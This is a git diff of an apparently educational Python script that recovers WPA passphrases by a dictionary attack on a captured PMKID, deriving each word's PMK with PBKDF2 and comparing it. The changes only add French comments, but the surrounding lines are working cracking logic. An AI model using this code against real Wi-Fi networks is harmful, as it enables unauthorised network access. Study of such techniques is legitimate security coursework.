@@ -39,13 +39,14 @@ def getFirstHandshake(packets, APmac):
     for packet in packets:
         #va chercher un paquet de handshake
         if packet.haslayer(EAPOL) and packet.type == 2 and packet.subtype == 8:
-            packetSrc = a2b_hex(packet.addr2.replace(":", ""))
+            packetSrc = a2b_hex(packet.addr2.replace(":", "")) #nettoie l'adresse avant d ela comparer
             #retourne le premier handshake de l'AP trouvé
             if packet.FCfield == "from-DS" and packetSrc == APmac:
                 return packet
 
 def printStatus(passPhrase, ssid, APmac, Clientmac, pmkid):
     print ("=============================")
+    #n'affiche une passphrase que si la variable est renseignée
     if passPhrase != "":
         print ("Passphrase: ",passPhrase,"\n")
     print ("SSID: ",ssid,"\n")
@@ -81,7 +82,7 @@ print ("=============================")
 for word in fileWords.readlines():
     #on nettoie le mot sinon \n fais encore partie du mot
     cleanWord = word.strip()
-    passPhrase = str.encode(cleanWord)
+    passPhrase = str.encode(cleanWord) #on encode la passphrase
 
     #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
     pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)
@@ -91,9 +92,10 @@ for word in fileWords.readlines():
 
     #on vérifie si les deux pmkid sont égaux
     if wordPMKID.digest()[:16] == pmkid:
+        #affiche les résultats
         print ("Correct passphrase : " + cleanWord)
         printStatus(cleanWord, ssid, APmac, Clientmac, pmkid)
-        exit()
+        exit() #fin du programme si on a trouvé la passphrase
     else:
         print("Wrong passphrase : " + cleanWord)
 
